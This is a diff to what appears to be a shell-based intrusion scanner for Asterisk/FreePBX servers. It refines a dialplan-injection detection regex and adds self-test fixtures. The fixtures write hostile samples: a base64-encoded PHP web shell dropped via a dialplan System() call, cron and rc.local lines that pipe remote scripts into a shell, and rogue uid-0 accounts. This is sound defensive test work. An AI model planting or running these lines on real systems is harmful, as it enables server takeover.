@@ -100,6 +100,7 @@ EXCLUDES=(
   -not -name "XML_Unserializer.php"
   -not -path "*/front_api/pabx_panel/Inspiracoes/*"
   -not -path "*/var/templates_c/*"
+  -not -path "*/fop2/admin/kint.php"   # biblioteca de debug Kint do FOP2 (usa eval legitimo)
 )
 
 log() { echo "$(date '+%Y-%m-%d %H:%M:%S') $*" >> "$LOG_FILE" 2>/dev/null; [ -t 1 ] && echo "$*"; return 0; }
@@ -595,7 +596,7 @@ check_dialplan() {
 check_dialplan_injection() {
   local g="${SENTINEL_DIALPLAN_GLOB:-/etc/asterisk/extensions*.conf}" hit
   # shellcheck disable=SC2086
-  hit="$(grep -nEi '^\[injection-[0-9]+\]|PD9waHA|<\?php|eval *\(|base64 *(-d|--decode)|(System|Shell)\(.*(curl|wget|base64|bash -i|nc -e|/dev/tcp|\.php)' $g 2>/dev/null | cut -c1-160 | head -n 3)"
+  hit="$(grep -nEi '^\[injection-[0-9]+\]|PD9waHA|<\?php|eval *\(|base64 *(-d|--decode)|(System|Shell)\(.*(curl|wget|base64|bash -i|nc -e|/dev/tcp|>[^)]*\.php)' $g 2>/dev/null | cut -c1-160 | head -n 3)"
   [ -n "$hit" ] || return 0
   seen_once "dialplan-inj|$hit" || return 0
   log "DIALPLAN injecao: $hit"
@@ -830,10 +831,11 @@ cmd_selftest() {
   echo '<?php eval($x($y("z"))); ?>'                          > "$T/web/admin/libraries/php-upgrade/compat.php"
   echo '<?php $v = doubleval($a); ?>'                          > "$T/web/admin/modules/core/XML_Unserializer.php"
   echo 'x' > "$T/web/admin/modules/phones/index.php"
+  mkdir -p "$T/web/fop2/admin"; echo '<?php eval(base64_decode("AAAA")); ?>' > "$T/web/fop2/admin/kint.php"
   mkdir -p "$T/bin" "$T/cron"
   printf '#!/bin/bash\ncase "$1" in is-enabled) exit 0;; is-active) echo inactive; exit 3;; *) exit 0;; esac\n' > "$T/bin/systemctl"; chmod +x "$T/bin/systemctl"
   echo 'exten => s,1,Goto(thanku-outcall,s,1)' > "$T/extensions_custom.conf"
-  printf '[injection-1]\nexten => s559368,1,System(echo PD9waHAgQGV2YWwoJF9QT1NUWzBdKTs/Pg== | base64 -d > /var/www/html/x.php)\n' > "$T/extensions_additional.conf"
+  printf 'exten => s,n,System(/var/lib/asterisk/bin/one_touch_record.php ${CHANNEL(name)})\n[injection-1]\nexten => s559368,1,System(echo PD9waHAgQGV2YWwoJF9QT1NUWzBdKTs/Pg== | base64 -d > /var/www/html/x.php)\n' > "$T/extensions_additional.conf"
   echo '* * * * * curl http://exemplo.invalido/x | sh' > "$T/cron/asterisk"
   printf 'root:x:0:0:root:/root:/bin/bash\nyum:x:0:0::/home/yum:/bin/bash\nabort:x:0:0::/:/bin/bash\nasterisk:x:100:100::/:/bin/bash\n' > "$T/passwd"
   printf '#!/bin/bash\n/usr/local/sbin/motd.sh > /etc/motd\nbash -c "curl -ks http://203.0.113.9/r/postroot.sh|bash"\n' > "$T/rc.local"
